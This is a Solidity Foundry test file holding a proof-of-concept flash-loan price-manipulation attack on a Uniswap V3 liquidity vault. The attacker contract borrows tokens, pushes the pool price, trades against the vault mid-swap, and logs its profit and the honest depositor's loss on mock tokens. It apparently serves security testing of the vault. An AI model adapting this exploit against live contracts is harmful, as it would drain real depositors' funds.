// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IUniswapV3Pool} from "@crane/contracts/protocols/dexes/uniswap/v3/interfaces/IUniswapV3Pool.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v3/libraries/TickMath.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IStandardExchangeInMulti} from "contracts/interfaces/IStandardExchangeInMulti.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IVaultFeeOracleManager} from "contracts/interfaces/IVaultFeeOracleManager.sol";
import {TestBase_UniswapV3FullSpreadStandardExchangeVault} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v3/test/bases/TestBase_UniswapV3FullSpreadStandardExchangeVault.sol";
import {IUniswapV3FullSpreadStandardExchangeVaultLiquidReserve as ILR} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v3/interfaces/IUniswapV3FullSpreadStandardExchangeVaultLiquidReserve.sol";

/// @notice Independent flash lender (not protocol). Charges 9 bps; reverts unless repaid in the same call.
contract AdjFlashLender {
    uint256 public constant FEE_BPS = 9;

    function flash(address[2] calldata tokens, uint256[2] calldata amounts, bytes calldata data) external {
        uint256[2] memory before;
        for (uint256 i; i < 2; ++i) {
            before[i] = IERC20(tokens[i]).balanceOf(address(this));
            IERC20(tokens[i]).transfer(msg.sender, amounts[i]);
        }
        AdjFlashBorrower(msg.sender).onFlash(tokens, amounts, data);
        for (uint256 i; i < 2; ++i) {
            require(
                IERC20(tokens[i]).balanceOf(address(this)) >= before[i] + amounts[i] * FEE_BPS / 10_000, "flash unpaid"
            );
        }
    }
}

interface AdjFlashBorrower {
    function onFlash(address[2] calldata tokens, uint256[2] calldata amounts, bytes calldata data) external;
}

/// @notice Unprivileged attacker contract.
contract AdjV3Attacker is AdjFlashBorrower {
    IUniswapV3Pool public immutable pool;
    IStandardExchangeProxy public immutable vault;
    AdjFlashLender public immutable lender;
    IERC20 public immutable t0;
    IERC20 public immutable t1;

    uint160 public sqrtTarget;
    uint160 public sqrtStart;
    uint8 internal phase; // 1 = push swap, 2 = restore swap, 3 = repay-buy
    // logged
    uint256 public soldToVault0;
    uint256 public gotFromVault1;
    uint256 public sharesMinted;
    bool public sawBlocked;

    constructor(IUniswapV3Pool pool_, IStandardExchangeProxy vault_, AdjFlashLender lender_) {
        pool = pool_;
        vault = vault_;
        lender = lender_;
        t0 = IERC20(pool_.token0());
        t1 = IERC20(pool_.token1());
    }

    function attack(uint160 sqrtTarget_, uint256 borrow0, uint256 borrow1) external {
        sqrtTarget = sqrtTarget_;
        (sqrtStart,,,,,,) = pool.slot0();
        t0.approve(address(vault), type(uint256).max);
        t1.approve(address(vault), type(uint256).max);
        IERC20(address(vault)).approve(address(vault), type(uint256).max);
        lender.flash([address(t0), address(t1)], [borrow0, borrow1], "");
    }

    function onFlash(address[2] calldata, uint256[2] calldata amounts, bytes calldata) external override {
        require(msg.sender == address(lender), "lender");
        // 1) push price of token0 up (token1 in) to sqrtTarget; vault ops run inside the swap callback.
        phase = 1;
        pool.swap(address(this), false, int256(t1.balanceOf(address(this))), sqrtTarget, "");
        // 2) restore price to start with token0 in.
        phase = 2;
        pool.swap(address(this), true, int256(t0.balanceOf(address(this))), sqrtStart, "");
        // 3) repay: buy any token0 shortfall from the pool with token1 (exact output).
        uint256 owe0 = amounts[0] + amounts[0] * lender.FEE_BPS() / 10_000;
        uint256 owe1 = amounts[1] + amounts[1] * lender.FEE_BPS() / 10_000;
        uint256 bal0 = t0.balanceOf(address(this));
        if (bal0 < owe0) {
            phase = 3;
            pool.swap(address(this), false, -int256(owe0 - bal0), TickMath.MAX_SQRT_RATIO - 1, "");
        }
        t0.transfer(address(lender), owe0);
        t1.transfer(address(lender), owe1);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == address(pool), "pool");
        if (phase == 1) {
            _vaultLeg();
        }
        if (amount0Delta > 0) t0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) t1.transfer(msg.sender, uint256(amount1Delta));
    }

    /// @dev Pool is locked (slot0.unlocked == false) and slot0 already holds the pushed price.
    function _vaultLeg() internal {
        sawBlocked = !ILR(address(vault)).canOpenBoundPoolOps();
        require(sawBlocked, "not blocked");
        uint256 free1 = t1.balanceOf(address(vault));
        (uint256 d0, uint256 d1) = ILR(address(vault)).deployedReserve();
        uint256 R0 = t0.balanceOf(address(vault)) + d0;
        uint256 R1 = free1 + d1;
        uint256 y = free1 * 97 / 100; // target output, below the free sleeve
        uint256 x = y * R0 / (R1 - y) + 1; // fee-free x*y input for y
        soldToVault0 = x;sharesMinted = vault.exchangeIn(t0, x, IERC20(address(vault)), 0, address(this), false, block.timestamp);gotFromVault1 = vault.exchangeIn(IERC20(address(vault)), sharesMinted, t1, 0, address(this), false, block.timestamp);
    }
}

contract AdjV3FSProdParamsTest is TestBase_UniswapV3FullSpreadStandardExchangeVault {
    IUniswapV3Pool internal pool;
    IStandardExchangeProxy internal vault;
    IERC20 internal token0;
    IERC20 internal token1;
    address internal victim;
    AdjFlashLender internal lender;

    uint256 constant VICTIM_DEPOSIT = 1_000 ether;
    uint256 constant OWN_CAPITAL = 100 ether;

    function _setUpMarket(uint128 externalLiquidity) internal {
        ERC20PermitMintableStub a = new ERC20PermitMintableStub("Asset A", "A", 18, address(this), 0);
        ERC20PermitMintableStub b = new ERC20PermitMintableStub("Asset B", "B", 18, address(this), 0);
        pool = _createPoolOneToOne(address(a), address(b), FEE_MEDIUM);
        _seedExternalLiquidity(pool, externalLiquidity);
        vault = _deployVault(pool);
        token0 = IERC20(pool.token0());
        token1 = IERC20(pool.token1());

        // honest LP deposits before the attack
        victim = makeAddr("victim");
        a.mint(victim, VICTIM_DEPOSIT);
        b.mint(victim, VICTIM_DEPOSIT);
        vm.startPrank(victim);
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        address[] memory tokens = new address[](2);
        tokens[0] = address(token0);
        tokens[1] = address(token1);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = VICTIM_DEPOSIT;
        amounts[1] = VICTIM_DEPOSIT;
        IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(
            tokens, amounts, IERC20(address(vault)), 0, victim, false, block.timestamp
        );
        vm.stopPrank();

        // independent flash liquidity
        lender = new AdjFlashLender();
        a.mint(address(lender), 1e30);
        b.mint(address(lender), 1e30);
    }

    /// @dev vault NAV in token1 at the current pool price (free + deployed + nothing owed counted separately).
    function _navInToken1() internal view returns (uint256 nav, uint256 r0, uint256 r1) {
        (uint256 d0, uint256 d1) = ILR(address(vault)).deployedReserve();
        r0 = token0.balanceOf(address(vault)) + d0;
        r1 = token1.balanceOf(address(vault)) + d1;
        (uint160 sp,,,,,,) = pool.slot0();
        uint256 px = uint256(sp) * uint256(sp) / (1 << 96); // price * 2^96
        nav = r1 + r0 * px / (1 << 96);
    }

    AdjV3Attacker internal att;
    uint256 internal navBefore;
    uint160 internal sp0;
    uint256 internal g0Before;
    uint256 internal g1Before;
    uint256 internal vaultL;

    function _run(uint128 externalLiquidity, uint256 sqrtMulBps) internal returns (int256 profit1, int256 vaultLoss) {
        _setUpMarket(externalLiquidity);
        _logPre(externalLiquidity, sqrtMulBps);
        (navBefore,,) = _navInToken1(); // at P0 == 1.0, no fees yet

        att = new AdjV3Attacker(pool, vault, lender);
        (sp0,,,,,,) = pool.slot0();
        uint160 target = uint160(uint256(sp0) * sqrtMulBps / 10_000);
        uint256 poolL = uint256(pool.liquidity());
        assertEq(token0.balanceOf(address(att)) + token1.balanceOf(address(att)), 0, "attacker starts empty");
        // attacker own capital (cost basis), subtracted from profit
        ERC20PermitMintableStub(address(token1)).mint(address(att), OWN_CAPITAL);

        uint256 need = poolL * (sqrtMulBps - 10_000) / 10_000 * 102 / 100;
        g0Before = pool.feeGrowthGlobal0X128();
        g1Before = pool.feeGrowthGlobal1X128();
        vaultL = poolL - uint256(externalLiquidity);

        att.attack(target, need, need);

        assertTrue(att.sawBlocked(), "vault ops ran in blocked mode");
        return _logPost();
    }

    function _logPre(uint128 externalLiquidity, uint256 sqrtMulBps) internal view {
        (uint256 d0, uint256 d1) = ILR(address(vault)).deployedReserve();
        console2.log("---- external L (e18):", uint256(externalLiquidity) / 1e18, " sqrt push bps:", sqrtMulBps);
        console2.log("pool L total (e18):", uint256(pool.liquidity()) / 1e18);
        console2.log("vault free0/free1 (e18):", token0.balanceOf(address(vault)) / 1e18, token1.balanceOf(address(vault)) / 1e18);
        console2.log("vault deployed0/deployed1 (e18):", d0 / 1e18, d1 / 1e18);
        console2.log("victim share fraction (1e18):",
            IERC20(address(vault)).balanceOf(victim) * 1e18 / IERC20(address(vault)).totalSupply());
    }

    /// @dev Neutral third party (test contract, not attacker, never touches the vault) returns pool to P0
    ///      so the vault can be valued at the original fair price. Its own P&L is excluded.
    function _restoreToP0() internal {
        (uint160 sp,,,,,,) = pool.slot0();
        if (sp == sp0) return;
        bool zeroForOne = sp > sp0;
        address tIn = zeroForOne ? address(token0) : address(token1);
        ERC20PermitMintableStub(tIn).mint(address(this), 1e27);
        pool.swap(address(this), zeroForOne, int256(1e27), sp0, abi.encode(address(this)));
    }

    /// @dev Vault NAV at P0 (=1.0): free + deployed + center fees earned (full-range => inside growth == global growth).
    function _navAtP0() internal view returns (uint256 nav, uint256 fees) {
        (uint160 sp,,,,,,) = pool.slot0();
        require(sp == sp0, "not at P0");
        (uint256 d0, uint256 d1) = ILR(address(vault)).deployedReserve();
        fees = (pool.feeGrowthGlobal0X128() - g0Before) * vaultL / (1 << 128)
            + (pool.feeGrowthGlobal1X128() - g1Before) * vaultL / (1 << 128);
        nav = token0.balanceOf(address(vault)) + d0 + token1.balanceOf(address(vault)) + d1 + fees;
    }

    function _logPost() internal returns (int256 profit1, int256 vaultLoss) {
        uint256 e0 = token0.balanceOf(address(att));
        uint256 e1 = token1.balanceOf(address(att));
        (uint160 spEnd,,,,,,) = pool.slot0();
        console2.log("attacker sold token0 to vault (e15):", att.soldToVault0() / 1e15);
        console2.log("attacker got token1 from vault (e15):", att.gotFromVault1() / 1e15);
        console2.log("attacker end token0 / token1 (wei):", e0, e1);
        console2.log("sqrtP start / end:", uint256(sp0), uint256(spEnd));
        console2.log("attacker shares left:", IERC20(address(vault)).balanceOf(address(att)));
        _restoreToP0();
        (uint256 navAfter, uint256 fees) = _navAtP0();
        console2.log("vault fees earned from attack swaps (wei):", fees);
        console2.log("vault NAV at P0 before / after (wei):", navBefore, navAfter);
        profit1 = int256(e1) + int256(e0) - int256(OWN_CAPITAL);
        vaultLoss = int256(navBefore) - int256(navAfter);
        console2.log("ATTACKER NET PROFIT (token1 wei):", profit1);
        console2.log("VAULT NAV LOSS at P0 (wei):", vaultLoss);
        console2.log("victim (honest LP) loss bps of NAV:", uint256(vaultLoss > 0 ? vaultLoss : int256(0)) * 10_000 / navBefore);
    }


    function runExt(uint128 ext, uint256 push) external returns (int256 p, int256 l) { return _run(ext, push); }

    function _try(uint128 ext, uint256 push) internal {
        try this.runExt(ext, push) returns (int256 p, int256 l) {
            console2.log("RESULT ext/push:", uint256(ext) / 1e18, push);
            console2.log("  ATTACKER NET PROFIT:"); console2.logInt(p);
            console2.log("  VAULT LOSS:"); console2.logInt(l);
        } catch (bytes memory e) {
            console2.log("RESULT ext/push REVERTED (attack infeasible / cannot repay):", uint256(ext) / 1e18, push);
            console2.logBytes(e);
        }
    }

    /// production-like depth: vault ~2% of in-range L (closest live analog: old SE on DTF/ETH Pons pool = 2.15%)
    function test_prodDepth_2pct_sleeve20() public virtual {
        _try(39_200e18, 11_000);
        _try(39_200e18, 12_000);
        _try(39_200e18, 13_000);
    }
}

/// production fee-oracle config from scripts/foundry/anvil_robinhood_main/Phase_04: no V3 FullSpread type default and no
/// global default => liquid reserve 0%.
contract AdjV3FSZeroSleeveTest is AdjV3FSProdParamsTest {
    function setUp() public virtual override {
        super.setUp();
        vm.prank(owner);
        IVaultFeeOracleManager(address(indexedexManager)).setDefaultLiquidReservePercentageOfTypeId(
            type(ILR).interfaceId, 0);
    }
    function test_zeroSleeve_lambda2() public {
        _setUpMarket(800e18);
        console2.log("0% sleeve: vault free0/free1 (wei) after honest deposit", token0.balanceOf(address(vault)), token1.balanceOf(address(vault)));
        console2.log("target reserve pct", ILR(address(vault)).targetLiquidReservePercentage());
        _try(800e18, 20_000);
    }
    function test_prodDepth_2pct_sleeve20() public override {}
}
